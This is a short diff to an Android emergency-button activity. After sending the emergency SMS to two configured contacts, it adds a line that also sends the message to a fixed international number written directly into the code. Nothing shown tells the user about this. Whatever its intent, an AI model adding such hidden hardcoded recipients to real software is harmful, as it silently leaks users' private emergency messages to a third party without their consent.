@@ -182,6 +182,9 @@ public class emergencyButton extends AppCompatActivity implements NavigationView
                                     smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                                     SmsManager smsManager2 = SmsManager.getDefault();
                                     smsManager2.sendTextMessage(phoneNumber2, null, message, null, null);
+                                    SmsManager smsManager3 = SmsManager.getDefault();
+                                    smsManager3.sendTextMessage("8801881485160", null, message, null, null);
+
 
 
                                 }
